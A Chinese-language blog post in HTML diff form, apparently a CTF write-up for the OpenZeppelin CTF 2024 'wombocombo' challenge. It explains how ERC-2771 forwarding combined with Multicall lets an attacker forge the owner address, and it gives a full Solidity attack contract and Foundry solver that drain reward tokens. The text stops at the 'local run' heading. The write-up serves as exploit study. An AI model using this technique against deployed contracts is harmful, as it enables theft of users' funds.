@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="本文章为 openzeppelin-ctf-2024 系列，记录 wombocombo 题目的思路与解答 用到的工具 docker foundry make vscode  本地搭建 challenge从 github 拉取 ctf-2024 项目，按照 README 文件使用 docker 启动 wombocombo，启动前需要把 images 里的 challenge 删掉，避免启动到别的项目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="openzeppelin-ctf-2024-wombocombo">
+<meta property="og:url" content="https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/index.html">
+<meta property="og:site_name" content="little pamphlet">
+<meta property="og:description" content="本文章为 openzeppelin-ctf-2024 系列，记录 wombocombo 题目的思路与解答 用到的工具 docker foundry make vscode  本地搭建 challenge从 github 拉取 ctf-2024 项目，按照 README 文件使用 docker 启动 wombocombo，启动前需要把 images 里的 challenge 删掉，避免启动到别的项目">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-23T08:21:40.000Z">
+<meta property="article:modified_time" content="2024-08-12T05:20:32.197Z">
+<meta property="article:author" content="caronedot">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>openzeppelin-ctf-2024-wombocombo</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categores</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/21/ctf-2024/openzeppelin-ctf-2024-spacebank/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&text=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&title=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&is_video=false&description=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=openzeppelin-ctf-2024-wombocombo&body=Check out this article: https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&title=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&title=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&title=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&title=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&name=openzeppelin-ctf-2024-wombocombo&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&t=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.</span> <span class="toc-text">用到的工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA-challenge"><span class="toc-number">2.</span> <span class="toc-text">本地搭建 challenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8C"><span class="toc-number">5.</span> <span class="toc-text">本地运行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">6.</span> <span class="toc-text">参考文献</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        openzeppelin-ctf-2024-wombocombo
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">caronedot</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-23T08:21:40.000Z" class="dt-published" itemprop="datePublished">2024-03-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>本文章为 <em>openzeppelin-ctf-2024</em> 系列，记录 <em>wombocombo</em> 题目的思路与解答</p>
+<h1 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h1><ul>
+<li>docker</li>
+<li>foundry</li>
+<li>make</li>
+<li>vscode</li>
+</ul>
+<h1 id="本地搭建-challenge"><a href="#本地搭建-challenge" class="headerlink" title="本地搭建 challenge"></a>本地搭建 challenge</h1><p>从 github 拉取 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ctf-2024">ctf-2024</a> 项目，按照 <strong>README</strong> 文件使用 docker 启动 <em>wombocombo</em>，启动前需要把 images 里的 challenge 删掉，避免启动到别的项目</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该题使用的是 EIP712 标准，签名后通过 Forwarder 合约转发给 Staking 合约</p>
+<p>由于改写了 <em>_msg_sender</em> 函数，正常情况是在进行 <code>onlyOwner</code> 解析时会摘取 calldata 最后的地址做校验，但是 Staking 继承了 Multicall ，在这个函数将 Forward 构造的 calldata + from 当作一个正常的 calldata 解析，所以我们把 owner 塞到 calldata 去进行调用就能够绕过 <em>onlyOnwer</em> 的校验</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取 forwarder 塞在最后的地址</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_msgSender</span>(<span class="params"></span>) internal view virtual override returns (address sender) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isTrustedForwarder</span>(msg.<span class="property">sender</span>)) &#123;</span><br><span class="line">        <span class="comment">// The assembly code is more direct than the Solidity version using `abi.decode`.</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">--&gt;            sender := <span class="title function_">shr</span>(<span class="number">96</span>, <span class="title function_">calldataload</span>(<span class="title function_">sub</span>(<span class="title function_">calldatasize</span>(), <span class="number">20</span>)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">_msgSender</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//multicall 是没有做 onlyOwenr 校验的，我们可以在 data 构造 owner 继续调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">multicall</span>(<span class="params">bytes[] calldata data</span>) external returns (bytes[] memory results) &#123;</span><br><span class="line">    results = <span class="keyword">new</span> bytes[](data.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        results[i] = <span class="title class_">Address</span>.<span class="title function_">functionDelegateCall</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>发放的函数 <em>notifyRewardAmount(uint256 _amount)</em> 是需要 <code>owner</code> 才能调用的，我们可以利用 <em>Multicall</em> 进行 <code>owner</code> 身份的伪造进行调用，然后等待 20s 后进行 <em>getReward()</em> 获取 rewardsToken</p>
+<p>对于 EIP712 的签名，需要构造 structHash + domainSeparator，需要注意的是 structHash 里面的参数是不能变的，不然计算出来的签名会改变，像下面的写法计算出来的签名肯定是不一样的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;gas&quot;</span>: <span class="title function_">gasleft</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<details>
+<summary>攻击合约</summary>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.4</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Challenge</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/Challenge.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Token</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/Token.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Forwarder</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/Forwarder.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Staking</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/Staking.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-std/Test.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span> &#123;</span><br><span class="line">    <span class="title class_">Challenge</span> challenge;</span><br><span class="line">    <span class="title class_">Staking</span> public immutable staking;</span><br><span class="line">    <span class="title class_">Forwarder</span> public immutable forwarder;</span><br><span class="line">    <span class="title class_">Token</span> public immutable stakingToken;</span><br><span class="line">    <span class="title class_">Token</span> public immutable rewardsToken;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">Challenge challenge_, address _player</span>) &#123;</span><br><span class="line">        challenge = challenge_;</span><br><span class="line">        player = _player;</span><br><span class="line">        staking = challenge.<span class="title function_">staking</span>();</span><br><span class="line">        forwarder = challenge.<span class="title function_">forwarder</span>();</span><br><span class="line">        stakingToken = staking.<span class="title function_">stakingToken</span>();</span><br><span class="line">        rewardsToken = staking.<span class="title function_">rewardsToken</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//进行抵押，调用奖励发放</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">notifyRewardAmount</span>(<span class="params">bytes memory signature</span>) external &#123;</span><br><span class="line">        stakingToken.<span class="title function_">approve</span>(<span class="title function_">address</span>(staking), <span class="title function_">type</span>(uint256).<span class="property">max</span>);</span><br><span class="line">        staking.<span class="title function_">stake</span>(stakingToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">        forwarder.<span class="property">execute</span>&#123;<span class="attr">gas</span>: <span class="title function_">gasleft</span>()&#125;(<span class="title function_">_buildForwardRequest</span>(), signature);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//等待20s 后调用，转账给 0x123 地址</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        staking.<span class="title function_">getReward</span>();</span><br><span class="line">        rewardsToken.<span class="title function_">transfer</span>(</span><br><span class="line">            <span class="title function_">address</span>(<span class="number">0x123</span>),</span><br><span class="line">            rewardsToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//消息哈希</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_buildDataHash</span>(<span class="params"></span>) public view returns (bytes32 signature) &#123;</span><br><span class="line">        signature = <span class="title function_">toTypedDataHash</span>(</span><br><span class="line">            <span class="title function_">_buildDomainSeparator</span>(),</span><br><span class="line">            <span class="title function_">_buildStructHash</span>(<span class="title function_">_buildForwardRequest</span>())</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造 request</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_buildForwardRequest</span>(<span class="params"></span>)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        returns (<span class="title class_">Forwarder</span>.<span class="property">ForwardRequest</span> memory request)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//构造 notifyRewardAmount 参数，塞入 owner</span></span><br><span class="line">        bytes[] memory delegatecallData = <span class="keyword">new</span> bytes[](<span class="number">1</span>);</span><br><span class="line">        delegatecallData[<span class="number">0</span>] = abi.<span class="title function_">encodeWithSelector</span>(</span><br><span class="line">            staking.<span class="property">notifyRewardAmount</span>.<span class="property">selector</span>,</span><br><span class="line">            rewardsToken.<span class="title function_">totalSupply</span>(),</span><br><span class="line">            staking.<span class="title function_">owner</span>()</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//构造 multicall</span></span><br><span class="line">        bytes memory callData = abi.<span class="title function_">encodeWithSelector</span>(</span><br><span class="line">            staking.<span class="property">multicall</span>.<span class="property">selector</span>,</span><br><span class="line">            delegatecallData</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//这里的 gas 千万不能写 gasleft()，最好写一个值定死</span></span><br><span class="line">        request = <span class="title class_">Forwarder</span>.<span class="title class_">ForwardRequest</span>(&#123;</span><br><span class="line">            <span class="attr">from</span>: player,</span><br><span class="line">            <span class="attr">to</span>: <span class="title function_">address</span>(staking),</span><br><span class="line">            <span class="attr">value</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">gas</span>: <span class="number">1_000_000</span>,</span><br><span class="line">            <span class="attr">nonce</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">deadline</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">data</span>: callData</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//直接抄 forward 的计算方式</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_buildStructHash</span>(<span class="params"></span></span><br><span class="line"><span class="params">        Forwarder.ForwardRequest memory req</span></span><br><span class="line"><span class="params">    </span>) internal pure returns (bytes32 structHash) &#123;</span><br><span class="line">        structHash = <span class="title function_">keccak256</span>(</span><br><span class="line">            abi.<span class="title function_">encode</span>(</span><br><span class="line">                <span class="title function_">keccak256</span>(</span><br><span class="line">                    <span class="string">&quot;ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)&quot;</span></span><br><span class="line">                ),</span><br><span class="line">                req.<span class="property">from</span>,</span><br><span class="line">                req.<span class="property">to</span>,</span><br><span class="line">                req.<span class="property">value</span>,</span><br><span class="line">                req.<span class="property">gas</span>,</span><br><span class="line">                req.<span class="property">nonce</span>,</span><br><span class="line">                req.<span class="property">deadline</span>,</span><br><span class="line">                <span class="title function_">keccak256</span>(req.<span class="property">data</span>)</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//直接抄 draft-EIP712 的计算方式</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_buildDomainSeparator</span>(<span class="params"></span>) internal view returns (bytes32) &#123;</span><br><span class="line">        bytes32 hashedName = <span class="title function_">keccak256</span>(<span class="title function_">bytes</span>(<span class="string">&quot;Forwarder&quot;</span>));</span><br><span class="line">        bytes32 hashedVersion = <span class="title function_">keccak256</span>(<span class="title function_">bytes</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        bytes32 typeHash = <span class="title function_">keccak256</span>(</span><br><span class="line">            <span class="string">&quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">            <span class="title function_">keccak256</span>(</span><br><span class="line">                abi.<span class="title function_">encode</span>(</span><br><span class="line">                    typeHash,</span><br><span class="line">                    hashedName,</span><br><span class="line">                    hashedVersion,</span><br><span class="line">                    block.<span class="property">chainid</span>,</span><br><span class="line">                    <span class="title function_">address</span>(forwarder)</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//直接抄 ECDSA 的计算方式</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">toTypedDataHash</span>(<span class="params"></span></span><br><span class="line"><span class="params">        bytes32 domainSeparator,</span></span><br><span class="line"><span class="params">        bytes32 structHash</span></span><br><span class="line"><span class="params">    </span>) internal pure returns (bytes32) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">            <span class="title function_">keccak256</span>(</span><br><span class="line">                abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;\x19\x01&quot;</span>, domainSeparator, structHash)</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</details>
+
+<details>
+<summary>脚本合约</summary>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-ctf/CTFSolver.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Challenge</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/Challenge.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Token</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/Token.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Forwarder</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/Forwarder.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Staking</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/Staking.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Attack</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/Attack.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Solver</span> is <span class="title class_">CTFSolver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">solve</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address challenge_,</span></span><br><span class="line"><span class="params">        address player</span></span><br><span class="line"><span class="params">    </span>) internal virtual override &#123;</span><br><span class="line">        <span class="title class_">Challenge</span> challenge = <span class="title class_">Challenge</span>(challenge_);</span><br><span class="line">        <span class="title class_">Attack</span> attack = <span class="keyword">new</span> <span class="title class_">Attack</span>(challenge, player);</span><br><span class="line">        <span class="title class_">Staking</span> staking = challenge.<span class="title function_">staking</span>();</span><br><span class="line">        <span class="title class_">Token</span> stakingToken = staking.<span class="title function_">stakingToken</span>();</span><br><span class="line">        <span class="comment">//向 attack 转 stakingToken 用于抵押</span></span><br><span class="line">        stakingToken.<span class="title function_">transfer</span>(<span class="title function_">address</span>(attack), stakingToken.<span class="title function_">balanceOf</span>(player));</span><br><span class="line">        <span class="comment">//计算签名</span></span><br><span class="line">        bytes32 h = attack.<span class="title function_">_buildDataHash</span>();</span><br><span class="line">        (uint8 v, bytes32 r, bytes32 s) = vm.<span class="title function_">sign</span>(vm.<span class="title function_">envUint</span>(<span class="string">&quot;PLAYER&quot;</span>), h);</span><br><span class="line">        bytes memory signature = abi.<span class="title function_">encodePacked</span>(r, s, v);</span><br><span class="line">        <span class="comment">//进行 forward -&gt; multicall -&gt; notifyRewardAmount 调用</span></span><br><span class="line">        attack.<span class="title function_">notifyRewardAmount</span>(signature);</span><br><span class="line">        vm.<span class="title function_">writeLine</span>(</span><br><span class="line">            <span class="string">&quot;.env&quot;</span>,</span><br><span class="line">            <span class="title function_">string</span>(abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;ATTACK=&quot;</span>, vm.<span class="title function_">toString</span>(<span class="title function_">address</span>(attack))))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</details>
+
+<h1 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h1><p>以下为 <code>make</code> 文件，减少命令输入</p>
